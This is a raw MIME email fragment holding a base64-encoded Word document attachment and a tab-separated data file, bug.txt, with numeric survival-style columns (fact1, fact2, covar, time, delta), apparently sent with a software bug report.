AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/v8AAAMKAQAAAAAAAAAAAAAAAAAA
AAAAAQAAAOCFn/L5T2gQq5EIACsns9kwAAAAXAEAABAAAAABAAAAiAAAAAIAAACQAAAAAwAAAKAA
AAAEAAAArAAAAAUAAADAAAAABwAAAMwAAAAIAAAA3AAAAAkAAADwAAAAEgAAAPwAAAAKAAAAGAEA
AAwAAAAkAQAADQAAADABAAAOAAAAPAEAAA8AAABEAQAAEAAAAEwBAAATAAAAVAEAAAIAAAAQJwAA
HgAAAAcAAABEZWFyIFIAZh4AAAABAAAAAGVhch4AAAAMAAAAcGl1cyBrb3JuZXIAHgAAAAEAAAAA
aXVzHgAAAAcAAABOb3JtYWwAch4AAAAMAAAAcGl1cyBrb3JuZXIAHgAAAAIAAAAxAHVzHgAAABQA
AABNaWNyb3NvZnQgV29yZCAxMC4xAEAAAAAA0klrAAAAAEAAAAAAuHDwH8bCAUAAAAAAirpbIMbC
AQMAAAABAAAAAwAAAAAAAAADAAAAAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7/AAADCgEAAAAAAAAAAAAAAAAAAAAAAAEAAAAC
1c3VnC4bEJOXCAArLPmuMAAAAPQAAAAMAAAAAQAAAGgAAAAPAAAAcAAAAAUAAACAAAAABgAAAIgA
AAARAAAAkAAAABcAAACYAAAACwAAAKAAAAAQAAAAqAAAABMAAACwAAAAFgAAALgAAAANAAAAwAAA
AAwAAADTAAAAAgAAABAnAAAeAAAABQAAAGV0aHoAAERlAwAAAAEAAAADAAAAAQAAAAMAAAAAAAAA
AwAAAHIJCgALAAAAAAAAAAsAAAAAAAAACwAAAAAAAAALAAAAAAAAAB4QAAABAAAABwAAAERlYXIg
UgAMEAAAAgAAAB4AAAAGAAAAVGl0bGUAAwAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAMAAAAEAAAABQAAAAYAAAAHAAAACAAAAAkAAAAK
AAAACwAAAP7///8NAAAADgAAAA8AAAAQAAAAEQAAABIAAAATAAAA/v///xUAAAAWAAAAFwAAABgA
AAAZAAAAGgAAABsAAAD+////HQAAAB4AAAAfAAAAIAAAACEAAAAiAAAAIwAAAP7////9////JgAA
AP7////+/////v//////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
/////////////////////////1IAbwBvAHQAIABFAG4AdAByAHkAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWAAUB//////////8DAAAABgkCAAAAAADAAAAAAAAA
RgAAAAAAAAAAAAAAAIDfvdQoxsIBKAAAAIAAAAAAAAAAMQBUAGEAYgBsAGUAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAgD///////////////8A
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAABAAAAAAAABXAG8AcgBkAEQA
bwBjAHUAbQBlAG4AdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGgAC
AQUAAAD//////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeFgAA
AAAAAAUAUwB1AG0AbQBhAHIAeQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAoAAIBAgAAAAQAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAFAAAAAAQAAAAAAAABQBEAG8AYwB1AG0AZQBuAHQAUwB1AG0AbQBhAHIAeQBJAG4AZgBv
AHIAbQBhAHQAaQBvAG4AAAAAAAAAAAAAADgAAgH///////////////8AAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAABAAAAAAAAABAEMAbwBtAHAATwBiAGoAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgACAQEAAAAGAAAA/////wAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABYAAAAAAAAAE8AYgBqAGUAYwB0
AFAAbwBvAGwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWAAEA
////////////////AAAAAAAAAAAAAAAAAAAAAAAAAACA373UKMbCAYDfvdQoxsIBAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAD///////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAABAAAA/v//////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
/////////////////////wEA/v8CAAEA/////wYJAgAAAAAAwAAAAAAAAEYYAAAATWljcm9zb2Z0
IFdvcmQgRG9jdW1lbnQA/v///05CNlcQAAAAV29yZC5Eb2N1bWVudC44AAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAA

--Apple-Mail-28-953181987--

--Apple-Mail-27-953181986
Content-Disposition: attachment;
	filename=bug.txt
Content-Transfer-Encoding: quoted-printable
Content-Type: text/tab-separated-values;
	x-mac-creator=5843454C;
	x-unix-mode=0644;
	x-mac-type=54455854;
	name="bug.txt"

fact1	fact2	covar	time	delta=0D57	1	71	100	=
0=0D24	27	73	100	0=0D54	42	74	46	1=0D24	=
27	77	100	0=0D60	42	78	100	0=0D33	1	=
78	100	0=0D60	42	79	100	0=0D54	42	79	=
100	0=0D24	1	79	100	0=0D48	27	80	78	=
1=0D54	1	80	100	0=0D54	42	81	34	1=0D24	=
27	81	48	1=0D24	1	81	100	0=0D48	40	=
81	100	0=0D58	1	82	13	1=0D60	27	82	=
100	0=0D24	27	82	100	0=0D60	1	83	14	=
1=0D24	1	83	45	1=0D54	42	83	100	0=0D60	=
42	83	100	0=0D33	1	84	41	1=0D54	42	=
84	45	1=0D60	1	84	74	1=0D57	42	84	=
100	0=0D24	27	84	100	0=0D24	27	84	100	=
0=0D24	42	84	100	0=0D60	42	85	100	0=0D57	=
42	85	100	0=0D54	1	85	100	0=0D58	27	=
86	3	1=0D60	1	86	41	1=0D54	1	86	=
58	1=0D54	1	86	100	0=0D60	27	86	100	=
0=0D24	1	86	100	0=0D24	1	86	100	0=0D24	=
27	87	25	1=0D54	1	87	100	0=0D54	42	=
87	100	0=0D54	42	87	100	0=0D57	27	87	=
100	0=0D54	40	87	100	0=0D24	42	87	100	=
0=0D24	42	87	100	0=0D24	42	87	100	0=0D24	=
40	88	63	1=0D24	42	88	68	1=0D54	42	=
88	89	1=0D54	42	88	100	0=0D54	40	88	=
100	0=0D33	27	88	100	0=0D54	1	88	100	=
0=0D54	40	88	100	0=0D54	27	88	100	0=0D54	=
1	88	100	0=0D24	1	88	100	0=0D24	27	=
88	100	0=0D24	42	88	100	0=0D24	49	88	=
100	0=0D54	40	89	10	1=0D54	1	89	43	=
